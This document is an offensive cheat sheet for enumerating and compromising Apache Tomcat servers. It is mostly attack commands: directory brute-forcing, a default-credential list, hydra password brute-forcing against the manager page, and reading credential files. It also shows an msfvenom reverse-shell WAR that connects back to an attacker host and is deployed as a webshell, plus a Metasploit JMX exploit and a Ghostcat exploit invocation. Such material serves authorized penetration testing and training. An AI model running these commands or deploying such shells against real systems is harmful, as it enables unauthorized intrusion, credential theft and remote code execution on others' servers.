# Tomcat Discovery and Enumeration

## 1. Tomcat Version Detection

### Methods

**HTTP Server Header**

```bash
curl -I http://<target>:<port>/ | grep -i "Server"
```

Check if the “Server” header reveals the Tomcat version.

**/docs Page**

```bash
curl -s http://<target>:<port>/docs/ | grep -i "Apache Tomcat"
```

The default documentation page may disclose the version.

**Error Pages**

```bash
curl -s http://<target>:<port>/nonexistentpage
```

Error messages may include Tomcat version details.

**File Inspection**
If access is possible, inspect `/lib` or related directories for JAR versions that indicate the Tomcat release.

---

## 2. Directory Structure (Key Files)

| Directory                | Description                                |
| ------------------------ | ------------------------------------------ |
| `/bin`                   | Executable scripts.                        |
| `/conf/tomcat-users.xml` | Stores usernames, passwords, and roles.    |
| `/conf/web.xml`          | Application routes and configuration.      |
| `/webapps/`              | Deployment directory for web applications. |

---

## 3. Manager Application Enumeration

### Directory Brute-Forcing

**Gobuster**

```bash
gobuster dir -u http://<target>:<port>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Wfuzz**

```bash
wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://<target>:<port>/FUZZ
```

Look for `/manager` and `/host-manager` paths.

### Authentication Testing

**Default Credentials**

```
tomcat:tomcat
admin:admin
tomcat:password
role1:role1
role:changeme
```

**Credential Brute-Force**

```bash
hydra -l tomcat -P /usr/share/wordlists/rockyou.txt <target> http-get /manager/html
```

After access, verify the ability to deploy or manage web applications.

---

## 4. Credential Enumeration

**tomcat-users.xml**

```bash
cat /conf/tomcat-users.xml
```

Locate plaintext credentials and role configurations.

**web.xml**

```bash
cat /webapps/<app>/WEB-INF/web.xml
```

Identify endpoints, routes, and role-based access mappings.

---

## 5. WAR File Upload (Remote Code Execution)

After authenticating to `/manager`, upload a malicious WAR file.

**Generate a Reverse Shell WAR**

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f war > shell.war
```

**Deploy via Manager**

```bash
http://<target>:<port>/manager/html
```

**Access Webshell**

```bash
http://<target>:<port>/shell.jsp
```

---

## 6. JMX Enumeration and Exploitation

**jmxterm**

```bash
java -jar jmxterm-1.0-alpha-4-uber.jar --url service:jmx:rmi:///jndi/rmi://<target>:<port>/jmxrmi
```

**Metasploit**

```bash
use exploit/multi/misc/java_jmx_server
set RHOST <target>
set RPORT 1099
run
```

JMX exposure can result in sensitive data disclosure or RCE.

---

## 7. Connector Enumeration

### AJP Connector (Port 8009)

**Detection**

```bash
nmap -p 8009 --script ajp-headers <target>
```

**Exploit (Ghostcat - CVE-2020-1938)**

```bash
python3 ghostcat.py -u <target>:8009
```

Misconfigured AJP connectors may allow file reads or code execution.

---

## 8. Web Application Enumeration

### Directory and File Discovery

```bash
gobuster dir -u http://<target>:<port>/webapps/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Find JSP Files**

```bash
wfuzz -c -z file,/usr/share/wordlists/extensions_common.txt --hc 404 http://<target>:<port>/FUZZ.jsp
```

**Parameter Fuzzing**

```bash
ffuf -u http://<target>:<port>/index.jsp?FUZZ=value -w /usr/share/wordlists/parameters.txt
```

---

## 9. Configuration File Enumeration

Inspect sensitive configuration files for credentials or misconfigurations:

* `catalina.properties`
* `server.xml`
* `context.xml`

---

## 10. CVE Enumeration and Exploitation

**Identify Known Vulnerabilities**

```bash
searchsploit tomcat <version>
```

**Search Public Exploits**

```bash
exploitdb -s tomcat
```
